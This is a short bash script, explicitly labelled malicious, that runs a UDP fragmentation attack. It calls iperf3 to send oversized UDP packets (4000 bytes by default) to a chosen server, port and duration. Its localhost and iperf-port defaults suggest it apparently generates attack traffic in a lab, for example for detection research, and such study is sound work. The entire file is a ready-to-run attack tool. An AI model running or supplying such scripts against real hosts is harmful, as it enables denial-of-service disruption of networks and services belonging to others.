#!/bin/bash
# Malicious: UDP Fragmentation attack - send oversized UDP packets to force fragmentation
# Usage: ./udp_fragmentation.sh <server_ip> [port] [duration_sec] [payload_size]
SERVER=${1:-127.0.0.1}
PORT=${2:-5201}
DURATION=${3:-60}
PAYLOAD=${4:-4000} # default > 2000 bytes
iperf3 -c "$SERVER" -p "$PORT" -u -b 1M -l "$PAYLOAD" -t "$DURATION"
